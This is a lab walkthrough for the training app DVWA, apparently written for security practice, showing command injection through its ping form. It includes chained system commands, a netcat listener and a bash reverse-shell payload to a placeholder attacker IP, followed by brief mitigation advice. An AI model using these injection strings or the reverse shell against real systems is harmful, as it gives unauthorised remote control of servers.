# 🔥 DVWA Remote Code Execution (RCE) Walkthrough

This guide documents the complete step-by-step process of exploiting **Command Injection / RCE** on **Damn Vulnerable Web Application (DVWA)**. It is written in a clean, professional, GitHub‑ready format with clear explanations and dedicated spaces where you can paste your screenshots.

---

# 📌 **Overview**

Remote Code Execution (RCE) is one of the most dangerous web vulnerabilities. It allows an attacker to execute system commands directly on the target server.

In DVWA, the **Command Injection** module simulates this vulnerability. This walkthrough covers:

* Understanding how the vulnerability works
* Identifying the injection point
* Executing system commands
* Spawning a reverse shell
* Verifying shell access
* Mitigation strategies

---

# 🚀 **Environment Setup**

* **Target:** DVWA running on localhost or VM
* **Attacker Machine:** Kali Linux
* **Module:** Command Injection (DVWA)
* **Security Level:** Low (for this walkthrough)

> <img width="657" height="359" alt="image" src="https://github.com/user-attachments/assets/881d96f8-06fa-4377-9c6f-7f25a72ea055" />


---

# 🧩 **1. Navigate to the Command Injection Module**

DVWA Sidebar → Vulnerabilities → **Command Injection**

On this page, DVWA asks for an IP address to ping.

> 📸 **<img width="652" height="664" alt="image" src="https://github.com/user-attachments/assets/ec1fe8db-ace9-4442-9598-0eae809e6e08" />
** *Command Injection module interface*

---

# 🧪 **2. Identify the Injection Point**

The input box is supposed to only accept IP addresses, but DVWA fails to sanitize the input.

You can test command execution using:

```
127.0.0.1; whoami
```

If the server executes the `whoami` command, the output appears below the form.

> 📸 **<img width="847" height="463" alt="image" src="https://github.com/user-attachments/assets/d6ed125d-677c-4e2c-b696-c7273fe40682" />
** *Successful command injection output*

---

# 💥 **3. Execute Arbitrary System Commands**

Try running more commands:

```
127.0.0.1; uname -a
127.0.0.1; ls -la
127.0.0.1; id
```

Each one should return system-level information.

> 📸 **<img width="857" height="370" alt="image" src="https://github.com/user-attachments/assets/da351b1b-a9aa-496b-a546-956305c72e98" />
** *Command execution results*

---

# 🧨 **4. Prepare a Reverse Shell Listener (Kali)**

On Kali Linux, open a listener:

```
nc -lvnp 4444
```

> 📸 **<img width="353" height="40" alt="image" src="https://github.com/user-attachments/assets/5475d8f9-4aa8-4a38-9ad2-ad3c550b63bc" />
** *Netcat listener on Kali*

---

# 🔗 **5. Execute the Reverse Shell Payload on DVWA**

Use this payload in DVWA:

```
127.0.0.1; bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1
```

Replace `YOUR_KALI_IP` with your actual IP.

If the environment and network allow outbound connections, the server will connect back to your Kali machine.

> 📸 **<img width="651" height="316" alt="image" src="https://github.com/user-attachments/assets/67f3e574-ca89-419c-b0aa-92aebef45b6c" />
** *Successful reverse shell connection*

---

# 💻 **6. Verify Interactive Remote Shell Access**

If the exploit succeeds, your Kali terminal now becomes a shell on the DVWA machine.

You can run:

```
whoami
pwd
ls
```

> 📸 **Insert Screenshot Here:** *Shell interaction from Kali*

---

# 🛡️ **Mitigation & Prevention**

To prevent RCE vulnerabilities:

### ✔ Input Validation

Use allowlists — only accept expected patterns.

### ✔ Command Sanitization

Never pass user input into system commands without strict filtering.

### ✔ Disable System Command Operators

Remove direct execution functions like:

* `exec()`
* `system()`
* `shell_exec()`
* `popen()`

### ✔ Use Prepared Statements / Safe APIs

Avoid direct shell interactions.

### ✔ Implement a Web Application Firewall (WAF)

Blocks malicious patterns automatically.

---

# 📝 **Conclusion**

This walkthrough demonstrates how improper input sanitization leads to full system compromise. DVWA makes it easy to practice, but the same vulnerability in a real system would be catastrophic.

Feel free to customize this documentation and insert your screenshots in the provided sections.

---

# 👤 **Author**

**Suleiman Zainab**
Your offensive security learning journey continues 🚀💻
